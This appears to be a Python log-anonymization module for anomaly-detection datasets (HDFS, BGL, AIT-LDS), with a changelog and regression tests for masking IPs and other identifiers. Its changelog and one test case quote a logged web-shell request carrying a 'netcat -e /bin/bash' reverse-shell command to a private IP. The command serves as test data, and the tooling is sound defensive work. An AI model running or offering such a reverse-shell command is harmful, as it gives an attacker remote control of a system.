"""
anonymizer.py — Module 1a: Anonymization Engine

Strips and masks sensitive identifiers from raw log lines before downstream
parsing or windowing. Rules run in list order; the first rule to match a span
wins.

Changelog
---------
v2 (this version) — IP boundary fix, found on real AIT-LDS data:
    A reverse-shell request contained
        "...cmd=netcat%20-e%20/bin/bash%20192.168.10.238%209951"
    and the raw IP survived masking. Cause: the IPv4 rules used "\\b", but the
    "0" in "%20" is a word character, so there is no boundary between it and
    the "1" of "192". Fixed by replacing "\\b" with explicit lookarounds:
      * left  : not preceded by a digit or dot, OR preceded by a %XX escape
      * right : not followed by a digit, or by a dot+digit (which would mean
                it is really the start of a longer dotted number)
    Verified: no regressions on the HDFS_2k / BGL_2k samples (see tests below).

v1 — node-ID pattern generalised (was leaking 151/2000 BGL node IDs) and a
    heuristic guard so "version: 1.0.0.12" is not masked as an IP.
"""
import re
from dataclasses import dataclass
from typing import List


@dataclass(frozen=True)
class MaskRule:
    name: str
    pattern: "re.Pattern"
    replacement: str
    context_aware: bool = False  # skip match if preceded by a version-like keyword


_OCTET = r"(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)"
_IPV4_BASE = rf"{_OCTET}\.{_OCTET}\.{_OCTET}\.{_OCTET}"

# Boundaries that (unlike \b) still work when an IP is glued to URL-encoded text.
_IP_LEFT = r"(?:(?<![\d.])|(?<=%[0-9A-Fa-f]{2}))"
_IP_RIGHT = r"(?!\d|\.\d)"

# Heuristic guard for the IP-vs-version-string ambiguity ("version: 1.0.0.12").
# Not bulletproof: no regex can fully tell a dotted version from an IP.
_VERSION_CONTEXT_RE = re.compile(r"(?i)\b(version|ver\.?|v)\s*[:=]?\s*$")
_CONTEXT_WINDOW = 15


def _context_aware_sub(pattern: "re.Pattern", replacement: str, text: str) -> str:
    def _replace(m: "re.Match") -> str:
        context = text[max(0, m.start() - _CONTEXT_WINDOW) : m.start()]
        if _VERSION_CONTEXT_RE.search(context):
            return m.group(0)
        return replacement

    return pattern.sub(_replace, text)


_RULES: List[MaskRule] = [
    # 1. IP with port (must precede bare IPv4)
    MaskRule(
        name="ipv4_with_port",
        pattern=re.compile(rf"{_IP_LEFT}{_IPV4_BASE}:\d{{1,5}}(?!\d)"),
        replacement="<IP_MASK>",
        context_aware=True,
    ),
    # 2. Bare IPv4
    MaskRule(
        name="ipv4",
        pattern=re.compile(rf"{_IP_LEFT}{_IPV4_BASE}{_IP_RIGHT}"),
        replacement="<IP_MASK>",
        context_aware=True,
    ),
    # 3. HDFS block identifiers
    MaskRule(
        name="hdfs_block_id",
        pattern=re.compile(r"\bblk_-?\d+\b"),
        replacement="<BLOCK_MASK>",
    ),
    # 4. BGL/HPC node coordinates, e.g. "R02-M1-N0-C:J12-U11" or "R37-M1-N4".
    #    The letter before the colon varies in real data (C, I, ...) and the
    #    colon segment is optional.
    MaskRule(
        name="hpc_node_id",
        pattern=re.compile(r"\bR\d{2}-M\d-N[0-9A-Z](?:-[A-Z]:[0-9A-Z\-\:]+)?\b"),
        replacement="<NODE_MASK>",
    ),
    # 5. user / uid / username
    MaskRule(
        name="user_identifier",
        pattern=re.compile(r"""(?i)\b(user|uid|username)\s*[:=]\s*['"]?([^\s,'"]+)['"]?"""),
        replacement=r"\1=<USER_MASK>",
    ),
    # 6. token / session / jwt / api key
    MaskRule(
        name="token_identifier",
        pattern=re.compile(r"""(?i)\b(token|session|jwt|api_?key)\s*[:=]\s*['"]?([^\s,'"]+)['"]?"""),
        replacement=r"\1=<TOKEN_MASK>",
    ),
    # 7. MAC addresses (':' or '-' separated)
    MaskRule(
        name="mac_address",
        pattern=re.compile(r"\b(?:[0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}\b"),
        replacement="<MAC_MASK>",
    ),
]


def anonymize_line(line: str) -> str:
    """Strip carriage returns, then apply every mask rule in order."""
    masked = line.replace("\r", "").strip("\n")
    for rule in _RULES:
        if rule.context_aware:
            masked = _context_aware_sub(rule.pattern, rule.replacement, masked)
        else:
            masked = rule.pattern.sub(rule.replacement, masked)
    return masked


def anonymize_file(in_path: str, out_path: str) -> int:
    """Process a file line-by-line (1 line in -> 1 line out, so line numbers
    in the raw and masked files always correspond)."""
    count = 0
    with open(in_path, "r", encoding="utf-8", errors="replace") as fin, open(
        out_path, "w", encoding="utf-8", newline="\n"
    ) as fout:
        for line in fin:
            fout.write(anonymize_line(line) + "\n")
            count += 1
    return count


# --- regression tests: (raw, must_contain, must_not_contain) ---------------
_TESTS = [
    ("blockMap updated: 10.251.73.220:50010 is added to blk_7128370237687728475 size 67108864",
     "<IP_MASK>", "10.251.73.220"),
    ("R02-M1-N0-C:J12-U11 RAS KERNEL INFO", "<NODE_MASK>", "R02-M1"),
    ("R04-M1-N4-I:J18-U11 RAS APP FATAL", "<NODE_MASK>", "R04-M1"),
    ("R37-M1-N4 NULL DISCOVERY SEVERE", "<NODE_MASK>", "R37-M1"),
    ("login attempt user=jsmith token='abc123XYZ' from 192.168.1.15", "<USER_MASK>", "jsmith"),
    ("version: 1.0.0.12 (do not mask version)", "1.0.0.12", "<IP_MASK>"),
    # the bug this version fixes: IP glued to URL-encoded text
    ('GET /static/evil.php?cmd=netcat%20-e%20/bin/bash%20192.168.10.238%209951 HTTP/1.1',
     "<IP_MASK>", "192.168.10.238"),
    ("connect 10.0.0.1:8080 then 10.0.0.2.", "<IP_MASK>", "10.0.0.2"),
    # must NOT be treated as an IP: 5-part dotted number and out-of-range octet
    ("oid 1.3.6.1.4.1 and 300.1.1.1", "1.3.6.1.4.1", "<IP_MASK>"),
]


def run_selftest() -> None:
    for raw, must_have, must_not in _TESTS:
        out = anonymize_line(raw)
        assert must_have in out, f"expected {must_have!r} in {out!r}"
        assert must_not not in out, f"{must_not!r} leaked/over-masked in {out!r}"
    print(f"all {len(_TESTS)} anonymizer regression tests passed")


if __name__ == "__main__":
    run_selftest()
